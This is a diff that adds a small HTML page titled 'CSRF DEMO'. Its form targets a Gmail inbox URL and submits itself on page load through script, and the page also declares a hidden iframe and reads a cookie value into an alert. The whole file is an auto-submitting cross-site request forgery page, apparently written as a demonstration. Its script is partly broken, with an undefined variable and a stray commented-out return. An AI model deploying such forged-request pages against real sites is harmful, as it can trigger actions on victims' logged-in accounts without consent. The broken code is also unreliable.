@@ -1,0 +1,18 @@
+<html>
+	<head> <title> CSRF DEMO </title> </head>
+	<body>
+		<form  name="csrf_form" method="GET" action="https://mail.google.com/mail/u/0/#inbox">
+		<script type="text/javascript">
+		var re = new RegExp(name + "=([^;]+)");
+	    	var value = re.exec(document.cookie);
+		alert(value);
+//	    	return (value != null) ? unescape(value[1]) : null;
+
+
+		document.csrf_form.submit();</script>
+		</form>
+		
+		
+		<iframe name="hiddenFrame" style="display:none;"> </iframe>
+	</body>
+</html>
